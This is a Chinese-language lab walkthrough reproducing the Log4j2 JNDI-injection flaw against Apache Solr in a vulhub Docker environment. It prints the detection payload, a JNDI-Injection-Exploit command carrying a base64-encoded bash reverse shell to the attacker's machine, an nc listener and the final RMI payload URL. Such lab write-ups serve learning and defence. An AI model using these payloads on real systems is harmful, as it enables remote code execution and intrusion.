  

## 前言

 **本次文章只用于技术讨论，学习，切勿用于非法用途，用于非法用途与本人无关！！！**

 **vulhub靶场下载地址:<https://vulhub.org/#/docs/>**

 **首先进入我们需要复现的漏洞靶场文件夹下,输入命令 : docker-compose up
-d![1650444970_625fcaaa816a9d8f0b5ba.png!small?1650444973413](https://image.3001.net/images/20220420/1650444970_625fcaaa816a9d8f0b5ba.png!small?1650444973413)
靶场启动成功后，浏览器访问: <http://192.168.42.129:8983/solr/admin/cores?action=1>**

**就进入到以下界面，显示的是一堆json格式的数据**

**![1650445154_625fcb62612eb18727675.png!small?1650445156404](https://image.3001.net/images/20220420/1650445154_625fcb62612eb18727675.png!small?1650445156404)**

 **访问http://dnslog.cn/ 获取一个临时域名**

**![1650445451_625fcc8bf091ed83238a4.png!small](https://image.3001.net/images/20220420/1650445451_625fcc8bf091ed83238a4.png!small)**

 **利用获取到的临时域名构造payload ，直接访问**

**[http://192.168.42.129:8983/solr/admin/cores?action=${jndi:ldap://ywk5lh.dnslog.cn}](http://192.168.42.129:8983/solr/admin/cores?action=$%7Bjndi:ldap://ywk5lh.dnslog.cn%7D)**

**![1650445648_625fcd50243be1919903b.png!small?1650445650222](https://image.3001.net/images/20220420/1650445648_625fcd50243be1919903b.png!small?1650445650222)**

 **访问之后，我们查看dnslog.cn页面,点击Refresh按钮刷新，可以看到有请求访问记录，表明存在log4j2漏洞**

**![1650445766_625fcdc644c9b1ebe7690.png!small?1650445768376](https://image.3001.net/images/20220420/1650445766_625fcdc644c9b1ebe7690.png!small?1650445768376)**

 **打开kali虚拟机，利用JNDI注入工具 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar**

 **JNDI注入工具下载地址: https://github.com/welk1n/JNDI-Injection-Exploit/releases/tag/v1.0**

 **192.168.42.129为kali攻击机监听地址，kali机执行**

 **java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C bash -c
"{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQyLjEyOS82OTY5IDA+JjE=}|{base64,-d}|{bash,-i}"
-A 192.168.42.129**

  

**![1650446162_625fcf525dd3dc6e876cf.png!small](https://image.3001.net/images/20220420/1650446162_625fcf525dd3dc6e876cf.png!small)**

**![1650446109_625fcf1d08e1fa76ed2e0.png!small](https://image.3001.net/images/20220420/1650446109_625fcf1d08e1fa76ed2e0.png!small)**

 **得到rmi、ldap参数：**

![1650446917_625fd245e352e3f3cc66d.png!small?1650446920047](https://image.3001.net/images/20220420/1650446917_625fd245e352e3f3cc66d.png!small?1650446920047)

 **然后在kali攻击机上开启nc监听6969端口**

**![1650446763_625fd1ab6d5e5ad089bc5.png!small?1650446765629](https://image.3001.net/images/20220420/1650446763_625fd1ab6d5e5ad089bc5.png!small?1650446765629)**

 **在浏览器访问payload**

**[http://192.168.42.129:8983/solr/admin/cores?action=${jndi:rmi://192.168.42.129:1099/rzzbnf}](http://192.168.29.130:8983/solr/admin/cores?action=$%7Bjndi:rmi://192.168.29.128:1099/vvl2u9%7D
"http://192.168.29.130:8983/solr/admin/cores?action=${jndi:rmi://192.168.29.128:1099/vvl2u9}")**

![1650447133_625fd31ddeeefe3660645.png!small?1650447135901](https://image.3001.net/images/20220420/1650447133_625fd31ddeeefe3660645.png!small?1650447135901)

**查看监听端，发现shell反弹成功**![1650447212_625fd36ccdf678a9b5629.png!small?1650447215521](https://image.3001.net/images/20220420/1650447212_625fd36ccdf678a9b5629.png!small?1650447215521)

 **至此漏洞复现完成，复现完后别忘了销毁靶场噢~**

![1650447311_625fd3cfa3e8e6236c2d9.png!small?1650447313868](https://image.3001.net/images/20220420/1650447311_625fd3cfa3e8e6236c2d9.png!small?1650447313868)

